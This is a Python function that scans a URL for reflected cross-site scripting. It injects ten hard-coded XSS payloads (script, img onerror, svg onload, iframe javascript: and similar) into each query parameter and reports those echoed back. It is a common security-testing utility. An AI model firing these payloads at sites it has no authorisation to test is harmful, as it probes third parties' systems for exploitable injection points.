import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def check_xss(url, payloads=None):
    # Use a rich set of default XSS payloads if none are provided
    if not payloads or len(payloads) == 0:
        payloads = [
            "<script>alert(1)</script>",
            "'\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "\"><svg/onload=confirm(1)>",
            "';alert(String.fromCharCode(88,83,83));//",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<math><mtext></mtext><script>alert(1)</script></math>",
            "<details open ontoggle=alert(1)>"
        ]
    
    vulnerabilities = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # If no query params exist, nothing to test.
    if not params:
        return vulnerabilities

    # Try injecting each payload into each parameter.
    for param in params:
        for payload in payloads:
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                res = requests.get(test_url, timeout=5)
                # If the payload appears in the response, we suspect an XSS vulnerability.
                if payload in res.text:
                    vulnerabilities.append(
                        f"XSS vulnerable parameter '{param}' using payload: {payload}\n→ {test_url}"
                    )
            except Exception:
                continue
    return vulnerabilities
